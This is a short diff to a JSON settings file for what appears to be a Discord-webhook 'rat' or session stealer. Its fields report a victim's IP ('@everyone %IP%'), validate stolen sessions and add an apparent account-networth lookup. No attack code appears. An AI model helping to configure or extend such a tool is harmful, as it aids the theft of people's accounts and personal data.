@@ -1,6 +1,6 @@
 {
-  "webhook": "YOUR WEBHOOK URL HERE",
-  "webhook_name": "Webhook",
+  "webhook": "YOUR_WEBHOOK_URL_HERE",
+  "webhook_name": "webhook",
   "webhook_avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
   "message": "@everyone %IP%",
 
@@ -31,5 +31,6 @@
   "file_embed_footer_text": "Rat",
   "file_embed_footer_icon": "https://bigrat.monster/media/bigrat.png",
 
-  "validate_session": true
+  "validate_session": true,
+  "networth_api": ""
 }
